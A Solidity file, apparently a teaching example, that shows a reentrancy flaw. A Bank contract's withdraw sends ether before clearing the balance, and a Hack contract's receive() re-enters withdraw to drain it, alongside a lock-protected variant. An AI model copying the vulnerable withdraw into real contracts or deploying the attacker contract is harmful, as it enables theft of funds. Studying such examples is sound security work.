// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

abstract contract ReentrancyGuard {
    bool private locked;

    modifier lock() {
        require(!locked, "locked");
        locked = true;
        _;
        locked = false;
    }
}

contract Bank is ReentrancyGuard {
    mapping(address => uint) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Not protected
    function withdraw() external {
        uint bal = balanceOf[msg.sender];
        payable(msg.sender).call{value: bal}("");
        balanceOf[msg.sender] = 0;
    }

    function withdrawProtected() external lock {
        // Note: this code is vulnerable to re-entrancy without the lock
        uint bal = balanceOf[msg.sender];
        payable(msg.sender).call{value: bal}("");
        balanceOf[msg.sender] = 0;
    }
}

contract Hack {
    address immutable target;
    
    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        if (target.balance >= 1e18) {
            Bank(target).withdraw();
        }
    }

    function pwn() external payable {
        Bank(target).deposit{value: 1e18}();
        Bank(target).withdraw();
    }
}